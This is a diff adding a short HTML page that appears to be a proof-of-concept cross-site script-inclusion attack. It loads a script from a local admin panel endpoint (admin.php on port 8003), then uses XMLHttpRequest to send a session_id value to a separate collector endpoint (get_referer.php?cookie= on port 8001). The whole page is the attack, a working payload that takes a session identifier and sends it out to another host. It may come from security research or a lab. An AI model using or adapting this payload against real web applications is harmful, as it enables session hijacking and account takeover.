@@ -1,0 +1,10 @@
+<html>
+<script src="http://127.0.0.1:8003/admin.php?c=js&ext=admin.plugin.js&_noCache=0.1560224709">
+</script>
+<script>
+var crossoriginget = new XMLHttpRequest();
+var url = 'http://127.0.0.1:8001/get_referer.php?cookie='+session_id;
+crossoriginget.open('GET', url, true);
+crossoriginget.send();
+</script>
+</html>
